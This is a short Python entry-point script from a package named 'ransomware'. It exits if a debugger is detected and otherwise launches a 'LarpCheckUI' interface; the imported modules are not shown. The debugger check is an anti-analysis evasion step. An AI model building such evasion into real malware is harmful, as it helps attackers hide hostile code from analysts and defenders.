from ransomware.security import is_being_debugged
from ransomware.ui.app import LarpCheckUI
import sys


def main() -> None:
    if is_being_debugged():
        print("Debugger detected. Exiting.")
        sys.exit(1)

    app = LarpCheckUI()
    app.run()


if __name__ == "__main__":
    main()
